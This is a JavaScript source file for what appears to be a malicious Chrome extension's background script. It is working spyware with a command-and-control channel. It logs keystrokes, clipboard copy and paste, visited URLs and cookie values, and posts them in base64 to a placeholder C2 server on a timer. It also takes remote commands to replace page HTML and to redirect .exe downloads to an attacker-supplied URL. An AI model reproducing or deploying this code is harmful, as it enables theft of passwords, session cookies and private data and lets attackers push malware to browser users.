const sleepTime = 1;
const c2Addr = 'http://SERVER/checkin.php';

/**
 * Registers with C2 server and sends inital data
 */
chrome.runtime.onInstalled.addListener(() => {
  const randomString = Math.random().toString(36).substring(2, 10);
  chrome.storage.local.set({ 'id': randomString });
  fetch(c2Addr, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ id: randomString, type: "register" })
  });
});

chrome.alarms.create("checkin", { periodInMinutes: sleepTime });
/**
 * Update the C2 server with logs and get commands
 */
chrome.alarms.onAlarm.addListener(function checkin() {
  debug("Checkin");

  chrome.storage.local.get('log', function (data) {
    chrome.storage.local.get('id', function (result) {

      const b64log = btoa(unescape(encodeURIComponent(data.log)))
      data.log = '';
      chrome.storage.local.set({ 'log': data.log });

      fetch(c2Addr, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ data: b64log, id: result.id, type: "checkin" })
      }).then((response) => {
        return response.json();
      }).then((json) => {
        if (Object.keys(json).length === 0) {
          return;
        }
        let commands = json.commands

        for (let i = 0; i < commands.length; i++) {

          let commandArgs = commands[i].split(',');

          if (commandArgs[0] == "replace_html") {

            chrome.storage.local.set({ 'replace_html': 1 });
            chrome.storage.local.set({ 'replace_html_url': commandArgs[1] });

          } else if (commandArgs[0] == "replace_download") {

            chrome.declarativeNetRequest.updateDynamicRules({
              removeRuleIds: [1]
            });
            chrome.declarativeNetRequest.updateDynamicRules({
              addRules: [{
                "id": 1,
                "priority": 1,
                "action": { "type": "redirect", "redirect": { "url": commandArgs[1] } },
                "condition": { "urlFilter": ".*exe", "resourceTypes": ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "webtransport", "webbundle", "other"]}
              }]
            });

            chrome.storage.local.set({ 'replace_download': 1 });

          }
        }
      });
    });
  });
});

/**
 * Store log data in local storage
 * @param {string} key 
 */
function addLog(key) {
  chrome.storage.local.get('log', function (data) {
    if (!data.log) {
      data.log = '';
    }

    if (data.length != 1) {
      data.log += data.log.trim() + key + '\n';
    } else {
      data.log += key;
    }

    chrome.storage.local.set({ 'log': data.log });
  });
}

/**
 * Event listener for content script
 */
chrome.runtime.onConnect.addListener((port) => {
  console.assert(port.name === "conn");

  port.onMessage.addListener(({ type, data }) => {

    if (type == 'key') {
      addLog(data.replace("Enter", "\n"));
    } else if (type == 'paste') {
      addLog('PASTE:' + data);
    } else if (type == 'copy') {
      addLog('COPY:' + data);
    }
  });
});

/**
 * Event listener for tab changes
 */
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url && changeInfo.url != "chrome://newtab/" && changeInfo.url != "") {
    addLog(`\nSWITCH:${changeInfo.url}\n`);
  }
});

/**
 * Event listener for new tabs
 */
chrome.tabs.onActivated.addListener(({ tabId }) => {
  chrome.tabs.get(tabId, ({ url }) => {
    if (url != "chrome://newtab/" && url != "") {
      addLog(`\nSWITCH:${url}\n`);
    }
  });
});

/**
 * Event listener for cookie changes
 */
chrome.cookies.onChanged.addListener(({ cookie, cause }) => {
  if (cause !== "explicit" && cause !== "overwrite") {
    return;
  }

  addLog(`COOKIE ${cause}: ${cookie.domain},${cookie.name},${cookie.value},${cookie.expirationDate}`);
});

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
   if (request.check === "replace_html" && chrome.storage.local.get('replace_html')) {
      sendResponse({url: chrome.storage.local.get('replace_html_url')});
    }
  }
);
